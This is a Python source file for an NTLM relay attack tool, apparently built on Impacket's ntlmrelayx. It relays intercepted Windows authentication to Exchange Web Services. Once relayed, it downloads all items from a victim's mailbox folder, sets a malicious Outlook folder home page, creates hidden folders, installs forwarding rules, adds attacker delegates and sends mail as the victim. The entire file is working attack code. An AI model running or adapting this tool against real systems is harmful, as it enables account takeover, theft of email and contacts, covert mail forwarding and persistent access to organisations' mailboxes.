#!/usr/bin/python
# -*- coding: utf8 -*-
#
# Author: Arno0x0x, Twitter: @Arno0x0x
#
# This work is based on Impacket/NTLMRelayx

import argparse
import sys
import thread
import string
import re
import os
import cgi
from threading import Thread
from base64 import b64decode, b64encode
import xml.etree.cElementTree as ET

from impacket import version, smb3, smb

from lib import SMBRelayServer, HTTPRelayServer
from lib.config import NTLMRelayxConfig
from lib.targetsutils import TargetsProcessor, TargetsFileWatcher
from lib import helper
from lib import logger

#=========================================================================================
# GLOBAL CONFIG
#=========================================================================================
templatesFolder = "SOAPRequestTemplates/"
exchangeVersion = "Exchange2010_SP2"
exchangeNamespace = {'m': 'http://schemas.microsoft.com/exchange/services/2006/messages', 't': 'http://schemas.microsoft.com/exchange/services/2006/types'}
	
#=========================================================================================
# Class EWSAttack
#=========================================================================================
class EWSAttack(Thread):
	def __init__(self, config, HTTPClient, username):
		Thread.__init__(self)
		self.daemon = True
		self.config = config
		self.client = HTTPClient
		self.username = username
	
	#-----------------------------------------------------------------------------------------
	# Encodes the folder home page URL as a data structure expected by EWS
	# ref: http://www.infinitec.de/post/2011/10/05/Setting-the-Homepage-of-an-Exchange-folder-using-the-EWS-Managed-API.aspx
	# ref: https://social.msdn.microsoft.com/Forums/Lync/en-US/08572767-9375-4b87-9f05-7ff3e9928f89/ews-powershell-set-homepageurl?forum=exchangesvrdevelopment
	#-----------------------------------------------------------------------------------------
	def encodeHomePageURL(self, url):
		# Converting url to unicode string
		homePageHex = ''
		for c in url:
			homePageHex = homePageHex + c.encode('hex') + "00"

		# Preparing the structure
		s = "02" # WEBVIEW_PERSISTENCE_VERSION
		s = s + "00000001" # Type: WEBVIEWURL
		s = s + "00000001" # WEBVIEW_FLAGS_SHOWBYDEFAULT
		s = s + "00000000000000000000000000000000000000000000000000000000" # UNUSED
		s = s + "000000"
		s = s + format(len(homePageHex)/2+2,'x')
		s = s + "000000"
		s = s + homePageHex
		s = s + "0000"

		return b64encode(bytearray.fromhex(s))

	#-----------------------------------------------------------------------------------------
	# The thread entry point
	#-----------------------------------------------------------------------------------------
	def run(self):

		print helper.color("[+] Received response from EWS server")

		#------------------------------ GET FOLDER ITEMS ------------------------------
		if self.config.ewsRequest == "getFolder":
			print helper.color("[+] Received items list for folder [{}]".format(self.config.ewsFolder))
			try:
				folderXML = ET.fromstring(self.client.lastresult)

				#---- Create the output directory to save all items
				outputDir = "output/" + self.config.ewsFolder
				if not os.path.exists(outputDir):
					os.makedirs(outputDir)

				#---- Download all items
				print helper.color("[+] Sending requests to download all items from folder [{}]".format(self.config.ewsFolder))
				i = 0
				for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
					params = {'ExchangeVersion': exchangeVersion,'Id': item.get('Id'), 'ChangeKey': item.get('ChangeKey')}
					body = helper.convertFromTemplate(params, templatesFolder + "getItem.tpl")
					self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
					result = self.client.session.getresponse().read()

					itemXML = ET.fromstring(result)
					mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text

					try:
						extension = "vcf" if self.config.ewsFolder == "contacts" else "eml"
						fileName = outputDir + "/item-{}.".format(i) + extension
						with open(fileName, 'w+') as fileHandle:
							fileHandle.write(b64decode(mimeContent))
							fileHandle.close()
							print helper.color("[+] Item [{}] saved successfully".format(fileName))
					except IOError:
						print helper.color("[!] Could not write file [{}]".format(fileName))
					i = i + 1
			except Exception, e:
				print helper.color("[!] Error processing result for getFolder: [{}]".format(str(e)))

		#------------------------------ SET FOLDER HOME PAGE ------------------------------
		# Ref: https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/
		elif self.config.ewsRequest == "setHomePage":
			print helper.color("[+] Received FolderID for folder [{}]".format(self.config.ewsFolder))
			try:
				folderXML = ET.fromstring(self.client.lastresult)
				folderID = folderXML.find(".//t:FolderId", exchangeNamespace).get('Id')
				changeKey = folderXML.find(".//t:FolderId", exchangeNamespace).get('ChangeKey')
	
				#---- Prepare the request to set the homePageUrl
				homePage = self.encodeHomePageURL(self.config.ewsHomePageURL)
				params = {'ExchangeVersion': exchangeVersion, 'FolderId': folderID, 'ChangeKey': changeKey, 'HomePage': homePage }
				body = helper.convertFromTemplate(params, templatesFolder + "setHomePage.tpl")
	
				#---- Send the request
				print helper.color("[+] Sending request to set the [{}] folder's home page to [{}]".format(self.config.ewsFolder, self.config.ewsHomePageURL))
				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
				result = self.client.session.getresponse().read()
			
				#---- Prepare the request to create a hidden folder (trick to force the refresh of the Outlook client)
				params = {'ExchangeVersion': exchangeVersion, 'ParentFolder': self.config.ewsFolder }
				body = helper.convertFromTemplate(params, templatesFolder + "createHiddenFolder.tpl")
	
				#---- Send the request
				print helper.color("[+] Sending request to create a hidden folder under the [{}] folder".format(self.config.ewsFolder))
				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
				result = self.client.session.getresponse().read()
				print helper.color(result, 'blue')

			except Exception, e:
				print helper.color("[!] Error processing result for setHomePage: [{}]".format(str(e)))

		#------------------------------ FORWARD RULE ------------------------------
		elif self.config.ewsRequest == "forwardRule":
			print helper.color("[+] Forward rule deployed")
			print helper.color(self.client.lastresult, 'blue')

		#------------------------------ ADD DELEGATE ------------------------------
		elif self.config.ewsRequest == "addDelegate":
			try:
				#---- Prepare the request to resolve the user's principal eMail address
				params = {'ExchangeVersion': exchangeVersion, 'UserAccount': self.username.replace('\x00','') }
				body = helper.convertFromTemplate(params, templatesFolder + "resolveEmailAddr.tpl")
	
				#---- Send the request
				print helper.color("[+] Sending request to resolve the principal eMail address for user [{}] ".format(self.username))
				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
				result = self.client.session.getresponse().read()
				
				#---- Parse the response and retrieve the eMail address
				respXML = ET.fromstring(result)
				eMailAddress = respXML.find(".//t:EmailAddress", exchangeNamespace).text
				
				#---- Prepare the request to add a 'destAddress' as a delegate for the user's mailbox
				params = {'ExchangeVersion': exchangeVersion, 'TargetAddress': eMailAddress, 'DelegateAddress': self.config.ewsDestAddress }
				body = helper.convertFromTemplate(params, templatesFolder + "addDelegate.tpl")
	
				#---- Send the request
				print helper.color("[+] Sending request to add [{}] as a delegate address for [{}] inbox".format(self.config.ewsDestAddress, eMailAddress))
				self.client.session.request('POST', self.client.target, body, {"Content-Type":"text/xml"})
				result = self.client.session.getresponse().read()
				print helper.color(result, 'blue')

			except Exception, e:
				print helper.color("[!] Error processing result for addDelegate: [{}]".format(str(e)))
			
		#------------------------------ DEFAULT ------------------------------
		else:
			print helper.color(self.client.lastresult, 'blue')

#=========================================================================================
# 											MAIN
#=========================================================================================
# Process command-line arguments.
if __name__ == '__main__':

	RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
	ATTACKS = { 'EWS': EWSAttack}

	print version.BANNER
	print helper.color("[*] NtlmRelayX to Exchange Web Services - Author: @Arno0x0x")

	# Parse arguments
	parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
		                            "try to relay that connection to specified target(s) system")
	parser._optionals.title = "Main options"

	# Main arguments
	parser.add_argument("-h","--help", action="help", help='show this help message and exit')
	parser.add_argument("-v","--verbose", action="store_true", help='Increase output verbositys')
	parser.add_argument('-t',"--target", action='store', required=True, metavar = 'TARGET', help='EWS web service target to relay the credentials to, '
		          'in the form of a URL: https://EWSServer/EWS/exchange.asmx')
	parser.add_argument('-o', "--output-file", action="store", help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
	parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when '
		                'interacting with the domain to grab a session key for signing, format is domain/machine_name')
	parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
	parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')

	# EWS API arguments
	parser.add_argument("-r","--request", action="store", required=True,  choices=['sendMail', 'setHomePage', 'getFolder', 'forwardRule', 'addDelegate'], help='The EWS service to call')
	parser.add_argument("-d","--destAddresses", action="store", help='List of e-mail addresses to be used as destination for any EWS service that needs it.'
						' Must be separated by a comma.')
	parser.add_argument("-m","--message", action="store", help='Message File containing the body of the message as an HTML file')
	parser.add_argument("-s","--subject", action="store", help='Message subject')
	parser.add_argument("-f","--folder", action="store", choices=['inbox', 'sentitem', 'deleteditems', 'tasks','calendar','contacts'], help='The Exchange folder name to list')
	parser.add_argument("-u","--url", action="store", help='URL to be used for the setHomePage request')

	try:
	   args = parser.parse_args()
	except Exception, e:
	   print helper.color("[!] " + str(e))
	   sys.exit(1)

	# Set output verbosity
	if args.verbose:
		logger.init()
	
	#-----------------------------------------------------------------
	# Preparing the SOAPXMLRequest for the send eMail EWS Service
	#-----------------------------------------------------------------
	if args.request == "sendMail":
		if args.destAddresses and args.message and args.subject:
			#--- Get the message from file
			try:
				with open(args.message) as fileHandle:
					message = cgi.escape(fileHandle.read())
					fileHandle.close()
					print helper.color("[+] File [{}] successfully loaded !".format(args.message))
			except IOError:
				print color("[!] Could not open or read file [{}]".format(args.message))
				sys.exit(1)
			
			#--- Prepare the destAddresses block
			destAddressBlock = ""
			destAddresses = args.destAddresses.split(',')
			for destAddress in destAddresses:
				destAddressBlock = destAddressBlock + "<t:Mailbox><t:EmailAddress>{}</t:EmailAddress></t:Mailbox>".format(destAddress)
			
			#--- Prepare the final EWS SOAP XML Request body
			body = helper.convertFromTemplate({'ExchangeVersion': exchangeVersion, 'Subject': args.subject, 'Message': message, 'DestAddressBlock': destAddressBlock}, templatesFolder + "sendMail.tpl")
			
		else:
			print helper.color("[!] Missing mandatory arguments for [sendMail] request. Required arguments are: subject / destAddresses / message")
			sys.exit(1)

	#-----------------------------------------------------------------
	# Preparing the SOAPXMLRequest for the get folder items EWS Service
	#-----------------------------------------------------------------
	if args.request == "getFolder":
		if args.folder:
			#--- Prepare the final EWS SOAP XML Request body
			body = helper.convertFromTemplate({'ExchangeVersion': exchangeVersion, 'Folder': args.folder},templatesFolder +  "listFolder.tpl")
		else:
			print helper.color("[!] Missing mandatory arguments for [getFolder] request. Required arguments is: folder")
			sys.exit(1)

	#-----------------------------------------------------------------
	# Preparing the SOAPXMLRequest for the set home page EWS Service
	#-----------------------------------------------------------------
	if args.request == "setHomePage":
		if args.folder and args.url:
			#--- Prepare the final EWS SOAP XML Request body
			body = helper.convertFromTemplate({'ExchangeVersion': exchangeVersion, 'Folder': args.folder}, templatesFolder +  "getFolderID.tpl")
		else:
			print helper.color("[!] Missing mandatory arguments for [setHomePage] request. Required arguments are: folder / url")
			sys.exit(1)

	#-----------------------------------------------------------------
	# Preparing the SOAPXMLRequest for the forward rule creation EWS Service
	#-----------------------------------------------------------------
	if args.request == "forwardRule":
		if args.destAddresses:
			#--- Prepare the final EWS SOAP XML Request body
			body = helper.convertFromTemplate({'ExchangeVersion': exchangeVersion, 'DestAddress': args.destAddresses}, templatesFolder +  "forwardRule.tpl")
		else:
			print helper.color("[!] Missing mandatory arguments for [forwardRule] request. Required arguments are: destAddresses")
			sys.exit(1)

	print helper.color("[*] Running in relay mode to single host")
	targetSystem = TargetsProcessor(singletarget=args.target)

	#-----------------------------------------------------------------
	# Preparing the SOAPXMLRequest for the add delegate EWS Service
	#-----------------------------------------------------------------
	if args.request == "addDelegate":
		if args.destAddresses:
			# In the case of adding a delegate, the first request is a GET (so no body)
			body = None
		else:
			print helper.color("[!] Missing mandatory arguments for [addDelegate] request. Required arguments are: destAddresses")
			sys.exit(1)

	print helper.color("[*] Running in relay mode to single host")
	targetSystem = TargetsProcessor(singletarget=args.target)

	#-----------------------------------------------------------------
	# Setting up relay servers
	#-----------------------------------------------------------------
	for server in RELAY_SERVERS:
		#Set up config
		c = NTLMRelayxConfig()
		c.setTargets(targetSystem)
		c.setOutputFile(args.output_file)
		c.setEWSParameters(body, args.request, args.folder or None, args.destAddresses or None, args.url or None)
		c.setMode('RELAY')
		c.setAttacks(ATTACKS)

		if args.machine_account is not None and args.machine_hashes is not None and args.domain is not None:
		    c.setDomainAccount( args.machine_account,  args.machine_hashes,  args.domain)
		elif (args.machine_account is None and args.machine_hashes is None and args.domain is None) is False:
		    print helper.color("[!] You must specify machine-account/hashes/domain all together!")
		    sys.exit(1)

		s = server(c)
		s.start()
		
	print ""
	print helper.color("[*] Servers started, waiting for connections")
	while True:
		try:
		    sys.stdin.read()
		except KeyboardInterrupt:
		    sys.exit(1)
		else:
		    pass
